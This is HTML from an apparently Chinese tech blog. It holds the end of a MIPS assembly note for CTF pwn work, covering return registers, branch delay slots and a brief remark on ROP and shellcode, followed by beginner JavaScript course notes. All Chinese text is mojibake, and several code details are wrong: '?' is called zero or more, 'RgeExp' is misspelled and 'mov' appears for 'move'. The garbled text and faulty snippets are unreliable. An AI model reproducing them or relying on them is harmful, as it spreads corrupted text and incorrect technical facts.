      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jr    $ra;å¦‚æœå­å‡½æ•°é‡å¤åµŒå¥—ï¼Œåˆ™å°†$raçš„å€¼ä¿å­˜åœ¨å †æ ˆä¸­ï¼Œå› ä¸º$raæ€»æ˜¯ä¿å­˜å½“å‰æ‰§è¡Œçš„å­å‡½æ•°çš„è¿”å›åœ°å€</span><br></pre></td></tr></table></div></figure>



<p>ä»¥ä¸Šå¤§å¤šå‚è€ƒå¦‚ä¸‹</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://valeeraz.github.io/2020/05/08/architecture-mips/" >MIPSæ±‡ç¼–è¯­è¨€å…¥é—¨ - Sylvainâ€™s Blog (valeeraz.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259594" >2021ç¬¬å››å±Šå¼ºç½‘æ‹Ÿæ€é˜²å¾¡ç§¯åˆ†èµ›å·¥æ§pwn eserver WP - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="3-æµæ°´çº¿ç‰¹ç‚¹"   >
          <a href="#3-æµæ°´çº¿ç‰¹ç‚¹" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æµæ°´çº¿ç‰¹ç‚¹" class="headerlink" title="3.æµæ°´çº¿ç‰¹ç‚¹"></a>3.æµæ°´çº¿ç‰¹ç‚¹</h2>
      <p>ä»¥ä¸‹æŒ‡ä»¤çš„ï¼Œstrchr å‡½æ•°çš„å‚æ•°æ¥è‡ª $s0 è€Œä¸æ˜¯ $s2</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $a0, $s2;</span><br><span class="line">jalr strchr;</span><br><span class="line">move $a0, $s0;</span><br></pre></td></tr></table></div></figure>


        <h2 id="ğŸ”ºæ³¨ï¼šæµæ°´çº¿"   >
          <a href="#ğŸ”ºæ³¨ï¼šæµæ°´çº¿" class="heading-link"><i class="fas fa-link"></i></a><a href="#ğŸ”ºæ³¨ï¼šæµæ°´çº¿" class="headerlink" title="ğŸ”ºæ³¨ï¼šæµæ°´çº¿"></a>ğŸ”ºæ³¨ï¼šæµæ°´çº¿</h2>
      <p>å³è·³è½¬ä¹‹å‰ä¼šå…ˆä¸€æ­¥åŠ è½½ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œæ‰€ä»¥åœ¨å¯»æ‰¾ROPæ—¶ï¼Œæ³¨æ„çœ‹ä¸‹ä¸€æ­¥æŒ‡ä»¤éƒ½æ˜¯ä»€ä¹ˆï¼Œä¸ç„¶è·³è½¬è¿‡å»å‚æ•°æˆ–è€…æ ˆå¸§éƒ½æœ‰å¯èƒ½ä¼šå‡ºé”™çš„ã€‚</p>
<p>ä½†æ˜¯å› ä¸ºé€šå¸¸PWNé¢˜çš„MIPSé€šå¸¸æ˜¯ç”¨qemuçš„useræ¨¡å¼è¿è¡Œçš„ï¼Œè¿™ä¸ªå¯èƒ½å¯¼è‡´æŒ‡ä»¤æµæ°´æœ‰æ—¶å€™è¡¨ç°ä¸å‡ºæ¥ï¼Œæ‰€ä»¥ä¸æ²¡æœ‰è°ƒç”¨å‡½æ•°sleep(1)å»å°†æ•°æ®åŒºåˆ·æ–°åˆ°æŒ‡ä»¤åŒºåŸŸä¹Ÿæ˜¯å¯ä»¥æ‹¿åˆ°shellçš„ï¼›ä½†æ˜¯å¦‚æœé¢˜ç›®ä½¿ç”¨systemæ¨¡å¼éƒ¨ç½²ï¼Œæ·»åŠ è°ƒç”¨å‡½æ•°åˆ·æ–°æ•°æ®åŒºåŸŸå†è·³è½¬åˆ°shellcodeå°±å¾ˆå¿…è¦äº†ï¼Œä½†å¦‚æœæ˜¯ROPæ¥getshellå€’æ˜¯ä¸ç”¨åˆ·æ–°æ•°æ®ã€‚</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/11/02/Web%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8/">WEBæŠ€æœ¯ä¸åº”ç”¨è¯¾ç¨‹</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-11-02</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="WebæŠ€æœ¯ä¸åº”ç”¨è¯¾ç¨‹"   >
          <a href="#WebæŠ€æœ¯ä¸åº”ç”¨è¯¾ç¨‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#WebæŠ€æœ¯ä¸åº”ç”¨è¯¾ç¨‹" class="headerlink" title="WebæŠ€æœ¯ä¸åº”ç”¨è¯¾ç¨‹"></a>WebæŠ€æœ¯ä¸åº”ç”¨è¯¾ç¨‹</h1>
      
        <h1 id="ä¸€ã€Java-Script"   >
          <a href="#ä¸€ã€Java-Script" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€Java-Script" class="headerlink" title="ä¸€ã€Java Script:"></a>ä¸€ã€Java Script:</h1>
      
        <h2 id="1-å¼•å…¥scriptä»£ç ï¼š"   >
          <a href="#1-å¼•å…¥scriptä»£ç ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å¼•å…¥scriptä»£ç ï¼š" class="headerlink" title="1.å¼•å…¥scriptä»£ç ï¼š"></a>1.å¼•å…¥scriptä»£ç ï¼š</h2>
      <figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"></span></span></span><br><span class="line"><span class="xml"><span class="handlebars">	<span class="comment">&lt;!---javascript ä»£ç ---&gt;</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="2-å¼•å…¥å¤–éƒ¨scriptä»£ç "   >
          <a href="#2-å¼•å…¥å¤–éƒ¨scriptä»£ç " class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¼•å…¥å¤–éƒ¨scriptä»£ç " class="headerlink" title="2.å¼•å…¥å¤–éƒ¨scriptä»£ç "></a>2.å¼•å…¥å¤–éƒ¨scriptä»£ç </h2>
      <figure class="highlight html"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span> = <span class="string">&quot;externalJS.js&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></div></figure>




        <h2 id="3-å®šä¹‰å˜é‡ï¼š"   >
          <a href="#3-å®šä¹‰å˜é‡ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å®šä¹‰å˜é‡ï¼š" class="headerlink" title="3.å®šä¹‰å˜é‡ï¼š"></a>3.å®šä¹‰å˜é‡ï¼š</h2>
      
        <h3 id="1-èµ‹å€¼å®šä¹‰ï¼š"   >
          <a href="#1-èµ‹å€¼å®šä¹‰ï¼š" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-èµ‹å€¼å®šä¹‰ï¼š" class="headerlink" title="(1)èµ‹å€¼å®šä¹‰ï¼š"></a>(1)èµ‹å€¼å®šä¹‰ï¼š</h3>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line"><span class="keyword">var</span> str1 = <span class="string">&#x27;abc&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> phr = \<span class="string">`abc\$&#123;str&#125;`</span>;<span class="comment">//(ä½¿ç”¨è¿™ç§ç±»å‹æ’å…¥å…¶ä»–çš„å­—ç¬¦)</span></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-æœªèµ‹å€¼ï¼Œåˆå§‹åŒ–ç±»å‹"   >
          <a href="#2-æœªèµ‹å€¼ï¼Œåˆå§‹åŒ–ç±»å‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-æœªèµ‹å€¼ï¼Œåˆå§‹åŒ–ç±»å‹" class="headerlink" title="(2)æœªèµ‹å€¼ï¼Œåˆå§‹åŒ–ç±»å‹"></a>(2)æœªèµ‹å€¼ï¼Œåˆå§‹åŒ–ç±»å‹</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> i;</span><br><span class="line"><span class="keyword">typeof</span> i = <span class="string">&#x27;undefined&#x27;</span>;<span class="comment">//(è¿™ç§ç±»å‹è¢«åˆ¤å®šä¸ºFalse)</span></span><br></pre></td></tr></table></div></figure>

<p>â–²javaScriptçš„æµ®ç‚¹æ•°æ“ä½œä¸ä¸€å®šå‡†ç¡®ï¼š</p>
<p>0.1+0.2 = 0.300000â€¦..04</p>
<p>é€šå¸¸ä½¿ç”¨(0.1x10+0.2x10)/10çš„å½¢å¼</p>
<p>åœ¨å…¶ä»–è¯­è¨€ä¸­ä¹Ÿé€šå¸¸å­˜åœ¨çš„</p>

        <h3 id="3-ç‰¹æ®Šç±»å‹"   >
          <a href="#3-ç‰¹æ®Šç±»å‹" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ç‰¹æ®Šç±»å‹" class="headerlink" title="(3)ç‰¹æ®Šç±»å‹"></a>(3)ç‰¹æ®Šç±»å‹</h3>
      <p>nullå’Œundefinedçš„å€¼ç›¸ç­‰ï¼Œä½†æ˜¯ç±»å‹ä¸ä¸€æ ·ï¼Œnullçš„ç±»å‹æ˜¯object</p>

        <h2 id="4-å®šä¹‰å‡½æ•°"   >
          <a href="#4-å®šä¹‰å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-å®šä¹‰å‡½æ•°" class="headerlink" title="4.å®šä¹‰å‡½æ•°"></a>4.å®šä¹‰å‡½æ•°</h2>
      
        <h3 id="1-åˆå§‹å®šä¹‰"   >
          <a href="#1-åˆå§‹å®šä¹‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆå§‹å®šä¹‰" class="headerlink" title="(1)åˆå§‹å®šä¹‰"></a>(1)åˆå§‹å®šä¹‰</h3>
      <p>function function_name(){ â€¦â€¦. }</p>
<p>æ²¡æœ‰å®šä¹‰è¿”å›å€¼çš„å‡½æ•°ä¹Ÿä¼šè¿”å›Undefinedçš„ç±»å‹ã€‚</p>

        <h3 id="2-ä¼ å‚å®šä¹‰"   >
          <a href="#2-ä¼ å‚å®šä¹‰" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ä¼ å‚å®šä¹‰" class="headerlink" title="(2)ä¼ å‚å®šä¹‰"></a>(2)ä¼ å‚å®šä¹‰</h3>
      <p>â‘ å®šä¹‰function func(){â€¦}</p>
<p>ä»ç„¶å¯ä»¥è°ƒç”¨func(a,b,c)è¿™ç§ç±»å‹ï¼Œä¼ å…¥çš„å‚æ•°a,b,cè¢«å­˜æ”¾åœ¨argumentsè¿™ä¸ªæ•°ç»„ä¸­ï¼Œå…¨å±€çš„æ•°ç»„ã€‚</p>
<p>â‘¡å®šä¹‰function func(x){ return x}</p>
<p>å¯ä»¥è°ƒç”¨func()ï¼Œä¸ä¼ å‚ï¼Œå¦‚æœè¿”å›çš„æ˜¯undefinedç±»å‹çš„</p>

        <h3 id="3-å®šä¹‰çš„hoisted"   >
          <a href="#3-å®šä¹‰çš„hoisted" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å®šä¹‰çš„hoisted" class="headerlink" title="(3)å®šä¹‰çš„hoisted"></a>(3)å®šä¹‰çš„hoisted</h3>
      <p>å³å‡½æ•°å¯ä»¥å®šä¹‰åœ¨ä½¿ç”¨ä¹‹åï¼Œåº”è¯¥æ˜¯ç¼–è¯‘çš„æ—¶å€™è¿›è¡Œäº†æå‡æ“ä½œ</p>
<p>å˜é‡ä¹Ÿå…·æœ‰è¿™ä¸ªæ•ˆæœï¼Œæ¯”å¦‚åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸‹çš„æ‰€æœ‰å˜é‡çš„ä½œç”¨åŸŸéƒ½æ˜¯è¿™ä¸ªå‡½æ•°ï¼Œä½†æ˜¯å…¶å€¼å¹¶æ²¡æœ‰å¾—åˆ°æå‡ã€‚</p>
<p>å‡½æ•°å˜é‡çš„toStringå°±æ˜¯å‡½æ•°çš„å®šä¹‰è¡¨è¾¾å¼</p>

        <h3 id="4-strictæ¨¡å¼"   >
          <a href="#4-strictæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-strictæ¨¡å¼" class="headerlink" title="(4)strictæ¨¡å¼"></a>(4)strictæ¨¡å¼</h3>
      <p>å½“å‡½æ•°å®šä¹‰ä¸­ï¼ŒåŠ å…¥äº†â€use strictâ€æ—¶ï¼Œä¼šå¯¹å˜é‡çš„å£°æ˜æœ‰æ›´ä¸¥æ ¼çš„è¦æ±‚ï¼Œä¸èƒ½ç®€å•åœ°ç›´æ¥èµ‹å€¼ã€‚</p>

        <h3 id="5-non-hoistingæ¨¡å¼"   >
          <a href="#5-non-hoistingæ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-non-hoistingæ¨¡å¼" class="headerlink" title="(5)non-hoistingæ¨¡å¼"></a>(5)non-hoistingæ¨¡å¼</h3>
      
        <h3 id="6-Letå…³é”®å­—"   >
          <a href="#6-Letå…³é”®å­—" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-Letå…³é”®å­—" class="headerlink" title="(6)Letå…³é”®å­—"></a>(6)Letå…³é”®å­—</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="keyword">let</span> x = <span class="number">2</span>&#125;</span><br></pre></td></tr></table></div></figure>

<p>letä½¿å¾—xåªåœ¨{â€¦}è¿™ä¸ªå£°æ˜å—ä¸­æœ‰æ•ˆï¼Œå¤–é¢çš„è¯­å¥ä¸­xçš„å€¼ä¸º10ã€‚</p>

        <h2 id="5-å®šä¹‰å¯¹è±¡"   >
          <a href="#5-å®šä¹‰å¯¹è±¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-å®šä¹‰å¯¹è±¡" class="headerlink" title="5.å®šä¹‰å¯¹è±¡"></a>5.å®šä¹‰å¯¹è±¡</h2>
      
        <h3 id="1-åˆå§‹èµ‹å€¼"   >
          <a href="#1-åˆå§‹èµ‹å€¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆå§‹èµ‹å€¼" class="headerlink" title="(1)åˆå§‹èµ‹å€¼"></a>(1)åˆå§‹èµ‹å€¼</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;<span class="attr">name</span>:<span class="string">&quot;Alice&quot;</span>,<span class="attr">age</span>:<span class="number">23</span>,<span class="attr">country</span>:<span class="string">&quot;China&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>();<span class="comment">//(æ—¥æœŸå¯¹è±¡)</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-å¢åŠ å±æ€§"   >
          <a href="#2-å¢åŠ å±æ€§" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å¢åŠ å±æ€§" class="headerlink" title="(2)å¢åŠ å±æ€§"></a>(2)å¢åŠ å±æ€§</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user.fan = <span class="string">&quot;Banana&quot;</span>;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-åˆ é™¤å±æ€§"   >
          <a href="#3-åˆ é™¤å±æ€§" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-åˆ é™¤å±æ€§" class="headerlink" title="(3)åˆ é™¤å±æ€§"></a>(3)åˆ é™¤å±æ€§</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> user.name;</span><br></pre></td></tr></table></div></figure>




        <h3 id="4-éå†å¯¹è±¡"   >
          <a href="#4-éå†å¯¹è±¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-éå†å¯¹è±¡" class="headerlink" title="(4)éå†å¯¹è±¡"></a>(4)éå†å¯¹è±¡</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.keys(user);</span><br><span class="line"><span class="built_in">Object</span>.values(user);</span><br></pre></td></tr></table></div></figure>

<p>è·å–å˜é‡çš„keyå’Œvaluesçš„ç›¸å…³æ•°æ®</p>

        <h2 id="6-å®šä¹‰æ•°ç»„-ç±»å‹ä¸ºobject"   >
          <a href="#6-å®šä¹‰æ•°ç»„-ç±»å‹ä¸ºobject" class="heading-link"><i class="fas fa-link"></i></a><a href="#6-å®šä¹‰æ•°ç»„-ç±»å‹ä¸ºobject" class="headerlink" title="6.å®šä¹‰æ•°ç»„(ç±»å‹ä¸ºobject)"></a>6.å®šä¹‰æ•°ç»„(ç±»å‹ä¸ºobject)</h2>
      
        <h3 id="1-åˆå§‹å®šä¹‰-1"   >
          <a href="#1-åˆå§‹å®šä¹‰-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-åˆå§‹å®šä¹‰-1" class="headerlink" title="(1)åˆå§‹å®šä¹‰"></a>(1)åˆå§‹å®šä¹‰</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> anArr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-ç›¸å…³æ“ä½œ"   >
          <a href="#2-ç›¸å…³æ“ä½œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç›¸å…³æ“ä½œ" class="headerlink" title="(2)ç›¸å…³æ“ä½œ"></a>(2)ç›¸å…³æ“ä½œ</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">anArr[<span class="number">5</span>] = <span class="string">&quot;FooBar&quot;</span>;<span class="comment">//(è¿™ä¸ªä¹Ÿæ˜¯å¯ä»¥çš„)</span></span><br><span class="line">anArr.length;<span class="comment">//è¿”å›å€¼ä¸º6</span></span><br><span class="line">anArr.sort();<span class="comment">//æ’åºç›¸å…³</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="3-æ•°æ®ç»“æ„ç›¸å…³æ“ä½œ"   >
          <a href="#3-æ•°æ®ç»“æ„ç›¸å…³æ“ä½œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ•°æ®ç»“æ„ç›¸å…³æ“ä½œ" class="headerlink" title="(3)æ•°æ®ç»“æ„ç›¸å…³æ“ä½œ"></a>(3)æ•°æ®ç»“æ„ç›¸å…³æ“ä½œ</h3>
      
        <h4 id="â‘ å°¾éƒ¨æ“ä½œ"   >
          <a href="#â‘ å°¾éƒ¨æ“ä½œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ å°¾éƒ¨æ“ä½œ" class="headerlink" title="â‘ å°¾éƒ¨æ“ä½œ"></a>â‘ å°¾éƒ¨æ“ä½œ</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">anArr.push();</span><br><span class="line">anArr.pop();</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡é¦–éƒ¨æ“ä½œ"   >
          <a href="#â‘¡é¦–éƒ¨æ“ä½œ" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡é¦–éƒ¨æ“ä½œ" class="headerlink" title="â‘¡é¦–éƒ¨æ“ä½œ"></a>â‘¡é¦–éƒ¨æ“ä½œ</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">anArr.shift();</span><br><span class="line">anArr.unshift();</span><br></pre></td></tr></table></div></figure>


        <h3 id="4-filteræ–¹æ³•"   >
          <a href="#4-filteræ–¹æ³•" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-filteræ–¹æ³•" class="headerlink" title="(4)filteræ–¹æ³•"></a>(4)filteræ–¹æ³•</h3>
      <p>åˆ›å»ºæ–°æ•°ç»„æ£€æµ‹åŸæ•°ç»„</p>
<figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ages = [<span class="number">33</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">40</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkAdult</span>(<span class="params">age</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> age &gt;= <span class="number">18</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(ages.filter(checkAdult));</span><br><span class="line"><span class="built_in">console</span>.log(ages.filter(<span class="function"><span class="keyword">function</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> value &gt;= <span class="number">18</span>;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></div></figure>




        <h2 id="7-æ­£åˆ™è¡¨è¾¾å¼"   >
          <a href="#7-æ­£åˆ™è¡¨è¾¾å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#7-æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="7.æ­£åˆ™è¡¨è¾¾å¼"></a>7.æ­£åˆ™è¡¨è¾¾å¼</h2>
      
        <h3 id="1-å®šä¹‰æ­£åˆ™è¡¨è¾¾å¼"   >
          <a href="#1-å®šä¹‰æ­£åˆ™è¡¨è¾¾å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å®šä¹‰æ­£åˆ™è¡¨è¾¾å¼" class="headerlink" title="(1)å®šä¹‰æ­£åˆ™è¡¨è¾¾å¼"></a>(1)å®šä¹‰æ­£åˆ™è¡¨è¾¾å¼</h3>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/ab+c/</span>;<span class="comment">//(ä½¿ç”¨ä¸¤ä¸ª/æ¥å®šä¹‰æ­£åˆ™)</span></span><br><span class="line"><span class="keyword">var</span> re2 = <span class="keyword">new</span> RgeExp(<span class="string">&quot;ab+c&quot;</span>);<span class="comment">//(ä½¿ç”¨å¯¹è±¡æ¥å®šä¹‰æ­£åˆ™)</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="2-è°ƒç”¨æ­£åˆ™"   >
          <a href="#2-è°ƒç”¨æ­£åˆ™" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è°ƒç”¨æ­£åˆ™" class="headerlink" title="(2)è°ƒç”¨æ­£åˆ™"></a>(2)è°ƒç”¨æ­£åˆ™</h3>
      
        <h4 id="â‘ å­—ç¬¦ä¸²å½¢å¼"   >
          <a href="#â‘ å­—ç¬¦ä¸²å½¢å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ å­—ç¬¦ä¸²å½¢å¼" class="headerlink" title="â‘ å­—ç¬¦ä¸²å½¢å¼"></a>â‘ å­—ç¬¦ä¸²å½¢å¼</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;XXXXXXX abbbbc&quot;</span>.search(/ab+c);</span><br></pre></td></tr></table></div></figure>

<p>è¿”å›å€¼ä¸ºæŸ¥æ‰¾åˆ°çš„ç´¢å¼•ï¼Œæ²¡æ‰¾åˆ°åˆ™è¿”å›-1</p>

        <h4 id="â‘¡å¯¹è±¡è°ƒç”¨"   >
          <a href="#â‘¡å¯¹è±¡è°ƒç”¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡å¯¹è±¡è°ƒç”¨" class="headerlink" title="â‘¡å¯¹è±¡è°ƒç”¨"></a>â‘¡å¯¹è±¡è°ƒç”¨</h4>
      <figure class="highlight js"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/ab+c/</span>;</span><br><span class="line">re.exec(str);<span class="comment">//è¿”å›reè¿™ä¸ªè¡¨ç¤ºå¼çš„æ‰§è¡Œç»“æœï¼Œè¿”å›åŒ…å«ç»“æœçš„ä¸€ä¸ªæ•°ç»„</span></span><br></pre></td></tr></table></div></figure>


        <h3 id="3-æ¨¡å¼"   >
          <a href="#3-æ¨¡å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-æ¨¡å¼" class="headerlink" title="(3)æ¨¡å¼"></a>(3)æ¨¡å¼</h3>
      <p><code>...</code>è¡¨ä»»æ„å­—ç¬¦</p>
<p><code>+</code>è‡³å°‘ä¸€ä¸ª</p>
<p><code>*</code>0ä¸ªæˆ–å¤šä¸ª</p>
<p><code>?</code>0ä¸ªæˆ–å¤šä¸ª</p>
<p><code>\d</code>æ‰¾ä¸€ä¸ªæ•°å­— <strong>(digtal)</strong></p>
<p><code>\s</code>æ‰¾ä¸€ä¸ªç©ºæ ¼ <strong>(space)</strong></p>
<p><code>\b</code>æ‰¾ä¸€ä¸ªå•è¯çš„å¼€å§‹æˆ–ç»“å°¾</p>
<p><code>g</code>å…¨å±€æ¨¡å¼ï¼Œåœ¨è¡¨è¾¾å¼æœ«å°¾åŠ ä¸Šgä»£è¡¨å…¨å±€ï¼Œè¿”å›æ‰€æœ‰æŸ¥æ‰¾åˆ°çš„</p>
<p>æ¯”å¦‚åŒ¹é…abbbcå³å¯ç”¨<code>ab+c</code></p>
<p><code>var re3 = /[^\d]/;</code>è¡¨æŸ¥æ‰¾ä¸æ˜¯æ•°å­—çš„</p>

        <h2 id="8-å¼‚å¸¸å¤„ç†"   >
          <a href="#8-å¼‚å¸¸å¤„ç†" class="heading-link"><i class="fas fa-link"></i></a><a href="#8-å¼‚å¸¸å¤„ç†" class="headerlink" title="8.å¼‚å¸¸å¤„ç†"></a>8.å¼‚å¸¸å¤„ç†</h2>
      <figure class="highlight javascript"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	Block <span class="keyword">of</span> code....</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">&quot;Help!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">catch</span>(err)&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(<span class="string">&quot;Error call&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    will be exec whatever there are some error....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="9-Debug"   >
          <a href="#9-Debug" class="heading-link"><i class="fas fa-link"></i></a><a href="#9-Debug" class="headerlink" title="9.Debug"></a>9.Debug</h2>
      <p>åœ¨chromeä¸­å¯ä»¥è°ƒè¯•ï¼Œå³æµè§ˆå™¨</p>

        <h2 id="10-æ–°çš„ç‰¹æ€§"   >
          <a href="#10-æ–°çš„ç‰¹æ€§" class="heading-link"><i class="fas fa-link"></i></a><a href="#10-æ–°çš„ç‰¹æ€§" class="headerlink" title="10.æ–°çš„ç‰¹æ€§"></a>10.æ–°çš„ç‰¹æ€§</h2>
      
        <h3 id="1-Modules"   >
          <a href="#1-Modules" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Modules" class="headerlink" title="(1)Modules"></a>(1)Modules</h3>
